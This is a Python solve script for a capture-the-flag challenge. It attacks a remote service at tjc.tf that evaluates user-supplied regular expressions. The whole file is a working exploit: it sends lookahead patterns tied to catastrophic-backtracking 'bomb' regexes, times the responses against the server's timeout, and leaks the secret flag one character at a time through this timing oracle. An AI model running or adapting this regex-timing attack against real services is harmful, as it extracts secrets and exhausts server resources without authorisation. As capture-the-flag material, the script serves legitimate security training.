#!/usr/bin/env python3
import argparse
import re
import socket
import statistics
import string
import time


DEFAULT_HOST = "tjc.tf"
DEFAULT_PORT = 31005
MAX_REGEX_LEN = 200
COMMON_ALPHABET = string.ascii_lowercase + string.digits + "_}"


class Remote:
    def __init__(self, host, port, timeout=5.0):
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.settimeout(timeout)
        self.buf = b""
        self.recv_until(b"regex> ")

    def recv_until(self, marker):
        while marker not in self.buf:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise EOFError("connection closed")
            self.buf += chunk
        idx = self.buf.index(marker) + len(marker)
        out = self.buf[:idx]
        self.buf = self.buf[idx:]
        return out

    def query(self, regex):
        data = regex.encode()
        if len(data) > MAX_REGEX_LEN:
            raise ValueError(f"regex too long ({len(data)} bytes): {regex!r}")

        start = time.perf_counter()
        self.sock.sendall(data + b"\n")
        reply = self.recv_until(b"regex> ")
        elapsed = time.perf_counter() - start

        if b"invalid regex" in reply:
            raise ValueError(f"server rejected regex: {regex!r}")
        if b"regex too long" in reply:
            raise ValueError(f"server says regex too long: {regex!r}")
        return elapsed

    def close(self):
        try:
            self.sock.close()
        except OSError:
            pass


def literal(text):
    return re.escape(text)


def char_class(chars):
    out = []
    for ch in chars:
        if ch in r"\^-]":
            out.append("\\" + ch)
        else:
            out.append(ch)
    return "".join(out)


def bomb(prefix_regex, bomb_power):
    # If the lookahead is true, this nested quantifier fails catastrophically
    # and hits the server's 0.20s regex alarm. If false, it returns immediately.
    return f"(?=^{prefix_regex})(?:.*){{{bomb_power}}}(?!)"


def median_query(remote, regex, samples):
    vals = [remote.query(regex) for _ in range(samples)]
    return statistics.median(vals), vals


def calibrate(remote, bomb_power, samples):
    fast_re = bomb(literal("tjctf!"), bomb_power)
    slow_re = bomb(literal("tjctf{"), bomb_power)

    fast_med, fast_vals = median_query(remote, fast_re, samples)
    slow_med, slow_vals = median_query(remote, slow_re, samples)
    threshold = (fast_med + slow_med) / 2

    if slow_med - fast_med < 0.08:
        raise RuntimeError(
            "timing gap too small; try increasing --bomb-power or --samples "
            f"(fast={fast_vals}, slow={slow_vals})"
        )

    print(f"[+] fast median: {fast_med:.4f}s")
    print(f"[+] slow median: {slow_med:.4f}s")
    print(f"[+] threshold:   {threshold:.4f}s")
    return threshold


def is_true(remote, regex, threshold, retries):
    vals = [remote.query(regex) for _ in range(retries)]
    med = statistics.median(vals)
    return med > threshold, med


def check_prefix(remote, prefix, threshold, bomb_power, retries):
    regex = bomb(literal(prefix), bomb_power)
    return is_true(remote, regex, threshold, retries)


def check_next_in(remote, prefix, chars, threshold, bomb_power, retries):
    regex = bomb(literal(prefix) + f"[{char_class(chars)}]", bomb_power)
    return is_true(remote, regex, threshold, retries)


def scan_next_char(remote, prefix, alphabet, threshold, bomb_power, retries):
    scores = []
    for ch in alphabet:
        regex = bomb(literal(prefix + ch), bomb_power)
        hit, med = is_true(remote, regex, threshold, retries)
        scores.append((med, ch, hit))

    scores.sort(reverse=True)
    for med, ch, _ in scores[:5]:
        ok, confirm_med = check_prefix(
            remote,
            prefix + ch,
            threshold,
            bomb_power,
            max(3, retries),
        )
        if ok:
            top = ", ".join(f"{c}:{t:.3f}" for t, c, _ in scores[:5])
            print(f"[.] candidates after {prefix!r}: {top}")
            return ch

    top = ", ".join(f"{c}:{t:.3f}" for t, c, _ in scores[:8])
    raise RuntimeError(f"could not confirm next char after {prefix!r}; top timings: {top}")


def split_next_char(remote, prefix, alphabet, threshold, bomb_power, retries):
    candidates = list(alphabet)
    while len(candidates) > 1:
        mid = len(candidates) // 2
        left = candidates[:mid]
        hit, _ = check_next_in(remote, prefix, left, threshold, bomb_power, retries)
        candidates = left if hit else candidates[mid:]

    ch = candidates[0]
    ok, _ = check_prefix(remote, prefix + ch, threshold, bomb_power, max(3, retries))
    if ok:
        return ch

    # A single timing spike can put binary search on the wrong branch. Fall
    # back to a full scan for this position instead of aborting the solve.
    return scan_next_char(remote, prefix, alphabet, threshold, bomb_power, retries)


def recover_flag(remote, alphabet, max_len, bomb_power, threshold, retries, strategy):
    known = "tjctf{"

    ok, med = check_prefix(remote, known, threshold, bomb_power, retries)
    if not ok:
        raise RuntimeError(f"known prefix did not time out; median={med:.4f}s")

    print(f"[+] prefix: {known}")

    while len(known) < max_len:
        if strategy == "scan":
            ch = scan_next_char(remote, known, alphabet, threshold, bomb_power, retries)
        else:
            ch = split_next_char(remote, known, alphabet, threshold, bomb_power, retries)

        known += ch

        print(f"[+] {known}")
        if ch == "}":
            return known

    raise RuntimeError("hit max length before closing brace")


def main():
    parser = argparse.ArgumentParser(description="Solve cryptoTAUtology timing-regex oracle")
    parser.add_argument("host", nargs="?", default=DEFAULT_HOST)
    parser.add_argument("port", nargs="?", type=int, default=DEFAULT_PORT)
    parser.add_argument("--alphabet", default=COMMON_ALPHABET)
    parser.add_argument("--max-len", type=int, default=80)
    parser.add_argument("--bomb-power", type=int, default=8)
    parser.add_argument("--samples", type=int, default=2, help="calibration samples")
    parser.add_argument("--retries", type=int, default=1, help="queries per predicate")
    parser.add_argument("--strategy", choices=("scan", "split"), default="scan")
    args = parser.parse_args()

    remote = Remote(args.host, args.port)
    try:
        threshold = calibrate(remote, args.bomb_power, args.samples)
        flag = recover_flag(
            remote,
            args.alphabet,
            args.max_len,
            args.bomb_power,
            threshold,
            args.retries,
            args.strategy,
        )
        print(f"[+] flag: {flag}")
    finally:
        remote.close()


if __name__ == "__main__":
    main()
